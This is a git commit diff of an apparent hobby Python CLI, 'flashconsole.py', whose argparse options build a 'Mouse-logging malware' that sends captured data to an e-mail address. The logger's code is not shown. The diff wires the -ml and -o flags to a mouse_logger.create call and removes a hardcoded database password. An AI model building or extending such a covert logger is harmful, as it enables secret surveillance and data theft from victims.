8458298198d912f15423bd326985780018bfefa6
Sami Hindi <sami@samihindi.com>
2022-08-19 19:05:39 +0200

    Mouse logger working fine

--- flashconsole.py
+++ flashconsole.py
@@ -14,10 +14,7 @@ from logger import mouse_logging as mouse_logger
 import mysql.connector as sql
 
 # Print the beginning
-exec(open('metadata/beginning.py').read())
-
-def say_hi():
-      print('Hello, World!')
+exec(open('/home/choki/projects/Flash-Project/  metadata/beginning.py').read())
 
 # Create an output folder if it doesnt exist, else print warning
 def output_folder(out_file):
@@ -29,40 +26,27 @@ def output_folder(out_file):
 
 # Create the parser and add arguments
 parser = argparse.ArgumentParser()
-parser.add_argument('--say-hi', help='It says Hi!', action="store_true")
+
 # 1
-parser.add_argument('--output-folder', help='Provide the command with an output folder.')
 parser.add_argument('-o', help='Provide the command with an output folder.')
 
 # 2
-parser.add_argument('-ml', help='Create a Mouse-logging malware and send to an E-Mail.', nargs='*')
-parser.add_argument('--mouse-logger', help='Create a Mouse-logging malware and send to an E-Mail.', nargs='*')
+parser.add_argument('-ml', help='Create a Mouse-logging malware and send to an E-Mail.')
 
 # Parse provided arguments
 args = parser.parse_args()
 # Check the results and run a function accordingly
-if args.say_hi:
-      say_hi()
-elif args.output_folder or args.o:
+if args.ml and args.o:
       # 1
-      output_folder(args.output_folder) if args.output_folder else output_folder(args.o)
-      try:
-            con = sql.connect(
-                  host="localhost",
-                  database="info__",
-                  user='user',
-                  password='user123'
-            )
+      print('Destination: ', args.ml)
+      print('Path: ', args.o)
+      destination = args.ml
+      path = str(args.o)
+      # TODO Add OS checker (if-statement)
+      output_folder_parts  = path.split("/")
+      output_path = path.replace(str(output_folder_parts[-1]), "")
+      mouse_logger.create(args.ml, args.o, output_path)
 
-            cursor = con.cursor()
-            cursor.execute('CREATE DATABASE info__')
-            cursor.execute('CREATE TABLE output_folder(output_folder VARCHAR(255))')
-            con.commit()
-      except:
-            print(colored('Failed connecting to Database...', 'red'))
-
-elif (args.ml or args.mouse_logger) and args.say_hi:
+elif args.o:
       # 2
-      say_hi()
-      if args.ml:
-            mouse_logger.create(args.ml[0], [1])
+      output_folder(args.o)
